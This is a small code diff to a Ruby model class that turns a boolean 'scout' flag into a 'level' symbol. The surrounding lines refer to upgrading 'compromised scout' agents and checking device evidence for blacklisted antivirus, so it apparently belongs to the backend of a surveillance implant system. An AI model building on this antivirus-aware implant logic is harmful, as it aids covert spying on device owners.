@@ -41,7 +41,7 @@ class Item
   field :deleted, type: Boolean, default: false
   field :uninstalled, type: Boolean
   field :demo, type: Boolean, default: false
-  field :scout, type: Boolean, default: false
+  field :level, type: Symbol, default: :scout
   field :upgradable, type: Boolean, default: false
   field :purge, type: Array, default: [0, 0]
 
@@ -369,7 +369,7 @@ class Item
     # delete any pending upgrade if requested multiple time
     self.upgrade_requests.destroy_all if self.upgradable
 
-    if self.scout
+    if self.level.eql? :scout
       raise "Compromised scout cannot be upgraded" if self.version <= 3
       
       # check the presence of blacklisted AV in the device evidence
